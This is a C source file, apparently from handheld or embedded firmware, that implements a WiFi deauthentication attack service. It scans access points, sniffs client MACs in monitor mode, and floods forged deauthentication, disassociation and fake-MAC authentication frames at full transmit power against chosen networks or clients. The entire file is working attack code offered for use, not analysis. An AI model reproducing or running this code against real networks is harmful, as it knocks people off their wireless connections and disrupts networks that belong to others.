/*
 * wifi_deauth_svc.c - Deauth attack service (state machine, no UI).
 */
#include "bs/bs_wifi.h"
#ifdef BS_HAS_WIFI

#include "wifi_deauth_svc.h"
#include "wifi_common.h"
#include "bs/bs_arch.h"
#include "bs/bs_wifi.h"

#include <stdio.h>
#include <string.h>
#include <stdarg.h>

/* ── Config ─────────────────────────────────────────────────────────────── */

#define SNIFF_TIME_MS       10000
#define ATTACK_BURST            1
#define AUTH_FLOOD_BURST        4

static const uint16_t k_reasons[] = {1, 4, 5, 7, 8, 17};
#define N_REASONS 6

/* ── Internal state ──────────────────────────────────────────────────────── */

static const bs_arch_t* s_arch;
static deauth_svc_state_t s_state;

/* AP list */
static wifi_ap_entry_t  s_aps[WIFI_MAX_APS];
static int              s_ap_count;

/* Client list */
static wifi_client_entry_t s_clients[WIFI_MAX_CLIENTS];
static int                 s_client_count;
static bool                s_broadcast_sel;

/* Sniff */
static uint8_t  s_sniff_channels[WIFI_MAX_APS];
static int      s_sniff_ch_count;
static int      s_sniff_ch_idx;
static uint32_t s_sniff_start_ms;  /* 0 = not yet started this slot */
static uint32_t s_sniff_now_ms;    /* last tick's now_ms during sniff */

/* Attack */
static wifi_pps_t  s_pps;
static wifi_prng_t s_prng;
static uint8_t     s_frame[AUTH_FRAME_LEN];
static uint16_t    s_seq;
static uint8_t     s_attack_ch;
static uint16_t    s_fixed_reason = 0;   /* 0 = use rotating k_reasons[] */

static const uint8_t k_broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/* Activity log */
static char  s_log[DEAUTH_SVC_LOG_LINES][DEAUTH_SVC_LOG_LEN];
static int   s_log_head;
static int   s_log_count;
static bool  s_log_dirty;

/* ── Log ─────────────────────────────────────────────────────────────────── */

static void svc_log(const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(s_log[s_log_head], DEAUTH_SVC_LOG_LEN, fmt, ap);
    va_end(ap);
    s_log[s_log_head][DEAUTH_SVC_LOG_LEN - 1] = '\0';
    s_log_head  = (s_log_head + 1) % DEAUTH_SVC_LOG_LINES;
    if (s_log_count < DEAUTH_SVC_LOG_LINES) s_log_count++;
    s_log_dirty = true;
}

/* ── Client helpers ──────────────────────────────────────────────────────── */

static bool client_known(const uint8_t mac[6]) {
    for (int i = 0; i < s_client_count; i++)
        if (memcmp(s_clients[i].mac, mac, 6) == 0) return true;
    return false;
}

static void client_add(const uint8_t mac[6]) {
    if (s_client_count >= WIFI_MAX_CLIENTS) return;
    if (client_known(mac)) return;
    memcpy(s_clients[s_client_count].mac, mac, 6);
    s_clients[s_client_count].selected = false;
    s_client_count++;
}

/* ── Promiscuous callback (WiFi task) ────────────────────────────────────── */

static void sniff_cb(const uint8_t* frame, uint16_t len,
                     int8_t rssi, void* ctx) {
    (void)rssi; (void)ctx;
    if (len < 24) return;
    uint8_t fc_type = frame[0] & 0x0C;
    uint8_t fc_sub  = (frame[0] >> 4) & 0x0F;
    if (fc_type == 0x08 || (fc_type == 0x00 && fc_sub == 4))
        client_add(frame + 10);
}

/* ── Sniff channel helpers ───────────────────────────────────────────────── */

static void build_sniff_channels(void) {
    s_sniff_ch_count = 0;
    for (int i = 0; i < s_ap_count; i++) {
        if (!s_aps[i].selected) continue;
        uint8_t ch = s_aps[i].ap.channel;
        bool dup = false;
        for (int j = 0; j < s_sniff_ch_count; j++)
            if (s_sniff_channels[j] == ch) { dup = true; break; }
        if (!dup && s_sniff_ch_count < WIFI_MAX_APS)
            s_sniff_channels[s_sniff_ch_count++] = ch;
    }
}

static void sniff_start_channel(void) {
    uint8_t ch = s_sniff_channels[s_sniff_ch_idx];
    bs_wifi_monitor_start(ch, sniff_cb, NULL);
    s_sniff_start_ms = 0;   /* sentinel: set from first tick */
    svc_log("Sniff ch.%d  (%d/%d)", ch, s_sniff_ch_idx + 1, s_sniff_ch_count);
}

/* ── Attack helpers ──────────────────────────────────────────────────────── */

static uint16_t random_reason(void) {
    if (s_fixed_reason) return s_fixed_reason;
    return k_reasons[wifi_prng_next(&s_prng) % N_REASONS];
}

static inline void apply_seq(uint8_t* frame) {
    frame[22] = (uint8_t)((s_seq & 0x0F) << 4);
    frame[23] = (uint8_t)(s_seq >> 4);
    s_seq++;
}

static void send_kick(const uint8_t* dst, const uint8_t* src,
                      const uint8_t* bssid, uint32_t now_ms) {
    uint16_t r = random_reason();
    wifi_build_deauth(s_frame, dst, src, bssid, r);
    apply_seq(s_frame);
    if (bs_wifi_send_raw(BS_WIFI_IF_AP, s_frame, DEAUTH_FRAME_LEN) == 0)
        wifi_pps_tick(&s_pps, now_ms);
    wifi_build_disassoc(s_frame, dst, src, bssid, r);
    apply_seq(s_frame);
    if (bs_wifi_send_raw(BS_WIFI_IF_AP, s_frame, DEAUTH_FRAME_LEN) == 0)
        wifi_pps_tick(&s_pps, now_ms);
}

static void attack_step(uint32_t now_ms) {
    for (int ai = 0; ai < s_ap_count; ai++) {
        if (!s_aps[ai].selected) continue;
        const uint8_t* bssid = s_aps[ai].ap.bssid;

        if (s_aps[ai].ap.channel != s_attack_ch) {
            s_attack_ch = s_aps[ai].ap.channel;
            bs_wifi_set_channel(s_attack_ch);
        }

        if (s_broadcast_sel) {
            for (int b = 0; b < ATTACK_BURST; b++)
                send_kick(k_broadcast, bssid, bssid, now_ms);
        }

        for (int ci = 0; ci < s_client_count; ci++) {
            if (!s_clients[ci].selected) continue;
            for (int b = 0; b < ATTACK_BURST; b++) {
                send_kick(s_clients[ci].mac, bssid, bssid, now_ms);
                send_kick(bssid, s_clients[ci].mac, bssid, now_ms);
            }
        }

        for (int b = 0; b < AUTH_FLOOD_BURST; b++) {
            uint8_t fake_mac[6];
            wifi_random_mac(&s_prng, fake_mac);
            wifi_build_auth_req(s_frame, bssid, fake_mac);
            apply_seq(s_frame);
            if (bs_wifi_send_raw(BS_WIFI_IF_AP, s_frame, AUTH_FRAME_LEN) == 0)
                wifi_pps_tick(&s_pps, now_ms);
        }
    }
}

/* ── Lifecycle ───────────────────────────────────────────────────────────── */

void deauth_svc_init(const bs_arch_t* arch) {
    s_arch = arch;
    deauth_svc_reset();
}

void deauth_svc_reset(void) {
    s_state         = DEAUTH_SVC_IDLE;
    s_ap_count      = 0;
    s_client_count  = 0;
    s_broadcast_sel = false;
    s_sniff_ch_count = 0;
    s_sniff_ch_idx   = 0;
    s_sniff_start_ms = 0;
    s_fixed_reason   = 0;
    s_log_head  = 0;
    s_log_count = 0;
    s_log_dirty = false;
    memset(s_aps,     0, sizeof(s_aps));
    memset(s_clients, 0, sizeof(s_clients));
}

void deauth_svc_set_reason(uint16_t reason) { s_fixed_reason = reason; }

void deauth_svc_attack_client(const uint8_t bssid[6], const uint8_t client[6],
                               uint8_t channel) {
    deauth_svc_reset();
    memcpy(s_aps[0].ap.bssid, bssid, 6);
    s_aps[0].ap.channel = channel;
    s_aps[0].ap.ssid[0] = '\0';
    s_aps[0].selected   = true;
    s_ap_count          = 1;
    s_broadcast_sel     = false;
    memcpy(s_clients[0].mac, client, 6);
    s_clients[0].selected = true;
    s_client_count        = 1;
    bs_wifi_set_tx_power(20);
    wifi_pps_init(&s_pps);
    wifi_prng_seed(&s_prng, s_arch->millis() ^ 0xDEA7CAFEu);
    s_seq       = (uint16_t)(s_arch->millis() & 0xFFF);
    s_attack_ch = 0;
    bs_wifi_set_channel(channel);
    char bmac[18], cmac[18];
    bs_wifi_bssid_str(bssid,   bmac);
    bs_wifi_bssid_str(client,  cmac);
    svc_log("Client deauth %s<->%s ch.%d", bmac, cmac, (int)channel);
    s_state = DEAUTH_SVC_ATTACKING;
}

/* ── Transitions ─────────────────────────────────────────────────────────── */

void deauth_svc_attack_broadcast(uint8_t channel) {
    deauth_svc_reset();
    /* Synthetic single-AP entry — no real scan needed */
    memset(s_aps[0].ap.bssid, 0, 6);
    s_aps[0].ap.channel = channel;
    s_aps[0].ap.ssid[0] = '\0';
    s_aps[0].selected   = true;
    s_ap_count          = 1;
    s_broadcast_sel     = true;
    bs_wifi_set_tx_power(20);
    wifi_pps_init(&s_pps);
    wifi_prng_seed(&s_prng, s_arch->millis() ^ 0xDEA7CAFEu);
    s_seq       = (uint16_t)(s_arch->millis() & 0xFFF);
    s_attack_ch = 0;
    bs_wifi_set_channel(channel);
    svc_log("Broadcast deauth on ch.%d", (int)channel);
    s_state = DEAUTH_SVC_ATTACKING;
}

void deauth_svc_attack_bssid(const uint8_t bssid[6], uint8_t channel) {
    deauth_svc_reset();
    memcpy(s_aps[0].ap.bssid, bssid, 6);
    s_aps[0].ap.channel = channel;
    s_aps[0].ap.ssid[0] = '\0';
    s_aps[0].selected   = true;
    s_ap_count          = 1;
    s_broadcast_sel     = true;
    bs_wifi_set_tx_power(20);
    wifi_pps_init(&s_pps);
    wifi_prng_seed(&s_prng, s_arch->millis() ^ 0xDEA7CAFEu);
    s_seq       = (uint16_t)(s_arch->millis() & 0xFFF);
    s_attack_ch = 0;
    bs_wifi_set_channel(channel);
    char mac[18]; bs_wifi_bssid_str(bssid, mac);
    svc_log("Targeted deauth %s ch.%d", mac, (int)channel);
    s_state = DEAUTH_SVC_ATTACKING;
}

void deauth_svc_scan_aps(void) {
    s_ap_count = 0;
    s_state    = DEAUTH_SVC_SCANNING;
    svc_log("Scanning for APs...");
    bs_wifi_scan_start();
}

void deauth_svc_sniff_clients(void) {
    if (s_state != DEAUTH_SVC_AP_READY) return;
    s_client_count = 0;
    build_sniff_channels();
    if (s_sniff_ch_count == 0) {
        s_state = DEAUTH_SVC_CLIENT_READY;
        svc_log("No APs selected");
        return;
    }
    s_sniff_ch_idx = 0;
    s_state = DEAUTH_SVC_SNIFFING;
    sniff_start_channel();
}

void deauth_svc_sniff_skip(void) {
    if (s_state != DEAUTH_SVC_SNIFFING) return;
    bs_wifi_monitor_stop();
    svc_log("Sniff skipped, %d clients", s_client_count);
    s_state = DEAUTH_SVC_CLIENT_READY;
}

void deauth_svc_attack_start(void) {
    if (s_state != DEAUTH_SVC_CLIENT_READY) return;
    bs_wifi_set_tx_power(20);
    wifi_pps_init(&s_pps);
    s_seq       = (uint16_t)(s_arch->millis() & 0xFFF);
    s_attack_ch = 0;

    int tgt = s_broadcast_sel ? 1 : 0;
    for (int i = 0; i < s_client_count; i++)
        if (s_clients[i].selected) tgt++;
    svc_log("Attack: %d target(s)", tgt);
    for (int i = 0; i < s_ap_count; i++) {
        if (!s_aps[i].selected) continue;
        svc_log("  AP ch%d %.12s",
                s_aps[i].ap.channel,
                s_aps[i].ap.ssid[0] ? s_aps[i].ap.ssid : "<hidden>");
    }
    if (s_broadcast_sel)
        svc_log("  -> BROADCAST");
    for (int i = 0; i < s_client_count; i++) {
        if (!s_clients[i].selected) continue;
        char mac[18];
        bs_wifi_bssid_str(s_clients[i].mac, mac);
        svc_log("  -> %s", mac);
    }

    s_state = DEAUTH_SVC_ATTACKING;
}

void deauth_svc_stop(void) {
    if (s_state == DEAUTH_SVC_SNIFFING)
        bs_wifi_monitor_stop();
    if (s_state == DEAUTH_SVC_ATTACKING)
        svc_log("Attack stopped: %lu frames", (unsigned long)s_pps.total);
    s_state = DEAUTH_SVC_DONE;
}

/* ── Tick ────────────────────────────────────────────────────────────────── */

void deauth_svc_tick(uint32_t now_ms) {
    switch (s_state) {
        case DEAUTH_SVC_SCANNING:
            if (bs_wifi_scan_done()) {
                bs_wifi_ap_t tmp[WIFI_MAX_APS];
                s_ap_count = bs_wifi_scan_results(tmp, WIFI_MAX_APS);
                for (int i = 0; i < s_ap_count; i++) {
                    s_aps[i].ap       = tmp[i];
                    s_aps[i].selected = false;
                }
                svc_log("Found %d APs", s_ap_count);
                s_state = DEAUTH_SVC_AP_READY;
            }
            break;

        case DEAUTH_SVC_SNIFFING:
            s_sniff_now_ms = now_ms;
            if (s_sniff_start_ms == 0) s_sniff_start_ms = now_ms;
            if ((now_ms - s_sniff_start_ms) >= SNIFF_TIME_MS) {
                bs_wifi_monitor_stop();
                svc_log("ch.%d done: %d client(s)",
                        (int)s_sniff_channels[s_sniff_ch_idx], s_client_count);
                s_sniff_ch_idx++;
                if (s_sniff_ch_idx < s_sniff_ch_count) {
                    sniff_start_channel();
                } else {
                    svc_log("Sniff complete: %d client(s)", s_client_count);
                    s_state = DEAUTH_SVC_CLIENT_READY;
                }
            }
            break;

        case DEAUTH_SVC_ATTACKING:
            attack_step(now_ms);
            break;

        default:
            break;
    }
}

/* ── State ───────────────────────────────────────────────────────────────── */

deauth_svc_state_t deauth_svc_state(void) { return s_state; }

/* ── AP list ─────────────────────────────────────────────────────────────── */

int deauth_svc_ap_count(void) { return s_ap_count; }

const wifi_ap_entry_t* deauth_svc_ap(int idx) {
    if (idx < 0 || idx >= s_ap_count) return NULL;
    return &s_aps[idx];
}

void deauth_svc_ap_toggle(int idx) {
    if (idx < 0 || idx >= s_ap_count) return;
    s_aps[idx].selected = !s_aps[idx].selected;
}

void deauth_svc_ap_select_all(void) {
    for (int i = 0; i < s_ap_count; i++) s_aps[i].selected = true;
}

void deauth_svc_ap_select_none(void) {
    for (int i = 0; i < s_ap_count; i++) s_aps[i].selected = false;
}

/* ── Client list ─────────────────────────────────────────────────────────── */

int deauth_svc_client_count(void) { return s_client_count; }

const wifi_client_entry_t* deauth_svc_client(int idx) {
    if (idx < 0 || idx >= s_client_count) return NULL;
    return &s_clients[idx];
}

void deauth_svc_client_toggle(int idx) {
    if (idx < 0 || idx >= s_client_count) return;
    s_clients[idx].selected = !s_clients[idx].selected;
}

bool deauth_svc_broadcast_selected(void) { return s_broadcast_sel; }

void deauth_svc_set_broadcast(bool on) { s_broadcast_sel = on; }

/* ── Sniff progress ──────────────────────────────────────────────────────── */

uint8_t deauth_svc_sniff_channel(void) {
    if (s_sniff_ch_count == 0) return 0;
    return s_sniff_channels[s_sniff_ch_idx];
}

int deauth_svc_sniff_ch_idx(void) { return s_sniff_ch_idx; }
int deauth_svc_sniff_ch_count(void) { return s_sniff_ch_count; }

uint32_t deauth_svc_sniff_elapsed_ms(void) {
    if (s_sniff_start_ms == 0) return 0;
    return s_sniff_now_ms - s_sniff_start_ms;
}

/* ── Attack metrics ──────────────────────────────────────────────────────── */

uint32_t deauth_svc_frames(void) { return s_pps.total; }
uint32_t deauth_svc_pps(void)    { return s_pps.pps;   }

/* ── Activity log ────────────────────────────────────────────────────────── */

int deauth_svc_log_count(void) { return s_log_count; }

const char* deauth_svc_log_line(int i) {
    if (i < 0 || i >= s_log_count) return "";
    int li = ((s_log_head - s_log_count + i) + DEAUTH_SVC_LOG_LINES)
             % DEAUTH_SVC_LOG_LINES;
    return s_log[li];
}

bool deauth_svc_log_dirty(void) { return s_log_dirty; }
void deauth_svc_log_clear_dirty(void) { s_log_dirty = false; }

#endif /* BS_HAS_WIFI */
